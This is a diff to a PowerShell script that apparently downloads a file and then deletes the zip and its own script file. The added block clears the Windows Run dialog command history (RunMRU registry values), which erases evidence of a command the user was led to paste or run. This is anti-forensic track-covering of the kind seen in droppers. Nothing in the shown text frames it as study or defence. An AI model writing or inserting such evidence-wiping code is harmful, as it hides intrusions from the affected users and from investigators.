@@ -57,6 +57,22 @@ finally {
     $webClient.Dispose()
 }
 
+# Clear Windows Run command history
+$runMRUPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
+try {
+    # Get all value names except the default one
+    $valueNames = Get-ItemProperty -Path $runMRUPath | Select-Object -ExpandProperty Property | Where-Object { $_ -ne "MRUList" }
+    # Remove each value
+    foreach ($value in $valueNames) {
+        Remove-ItemProperty -Path $runMRUPath -Name $value -ErrorAction Stop
+    }
+    # Clear the MRUList value to reflect the cleared history
+    Set-ItemProperty -Path $runMRUPath -Name "MRUList" -Value "" -ErrorAction Stop
+    "Run command history cleared successfully."
+} catch {
+    "Failed to clear Run command history. Error: $_"
+}
+
 $filesToDelete = @(
     "$zipFilePath",
     "C:\Users\$currentUser\script.ps1",
